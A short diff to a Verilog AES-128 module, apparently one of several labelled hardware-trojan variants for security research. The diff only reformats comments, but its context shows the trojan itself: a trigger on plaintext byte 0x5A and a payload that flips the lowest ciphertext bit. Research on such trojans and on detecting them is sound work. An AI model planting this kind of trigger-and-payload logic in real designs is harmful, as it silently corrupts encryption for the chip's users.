@@ -1,4 +1,3 @@
-// aes_128_trojan_tiny.v
 // TROJAN VARIANT 3: Minimal-Footprint Combinational Trojan
 // -----------------------------------------------------------------------
 // Trigger:  Combinational, single specific BYTE match -- watches only
@@ -27,7 +26,7 @@ module aes_128_trojan_tiny (
     output reg          done
 );
 
-    // ---- TROJAN TRIGGER LOGIC (tiny: only 8 bits watched) ----
+    // TROJAN TRIGGER LOGIC (tiny: only 8 bits watched)
     wire trojan_trigger = (plaintext[7:0] == 8'h5A);
 
     // ---- Key expansion (identical to clean baseline) ----
@@ -100,7 +99,7 @@ module aes_128_trojan_tiny (
                 end
 
                 DONE_ST: begin
-                    // ---- TROJAN PAYLOAD: flip 1 bit only if triggered ----
+                    // TROJAN PAYLOAD: flip 1 bit only if triggered
                     ciphertext <= trigger_latched ? {state_reg[127:8], state_reg[7:1], ~state_reg[0]}
                                                    : state_reg;
                     done       <= 1'b1;
